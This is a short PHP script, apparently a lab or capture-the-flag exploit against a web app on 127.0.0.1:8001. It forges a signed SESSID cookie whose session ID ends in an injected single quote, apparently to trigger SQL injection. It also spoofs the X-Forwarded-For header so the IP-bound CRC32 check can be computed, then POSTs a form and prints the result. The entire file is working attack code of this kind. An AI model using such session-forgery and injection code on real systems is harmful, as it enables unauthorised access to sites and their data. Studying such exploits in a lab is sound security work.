<?php



$session_id = '123456789012345678901234567890\'';

$len = strlen($session_id);
// if($len!=32){
//     echo $len;
//     die();
// }
$ip = ".";
$_ip = substr($ip, 0, strrpos($ip, '.'));
$SESSID = $session_id.sprintf('%08x', crc32($_ip . $session_id));


$body = "name=test&choose=1";

// Create a stream
$opts = array(
  'http'=>array(
    'method'=>"POST",
    'header'=>"Accept-language: en\r\n" .
              "Content-Type: application/x-www-form-urlencoded\r\n" .
              "Cookie: SESSID=$SESSID\r\n".
              "X-FORWARDED-FOR: $ip\r\n",
    'content' => $body
  )
);

$context = stream_context_create($opts);

// Open the file using the HTTP headers set above
$file = file_get_contents('http://127.0.0.1:8001/index.php', false, $context);

print_r($file);
?>
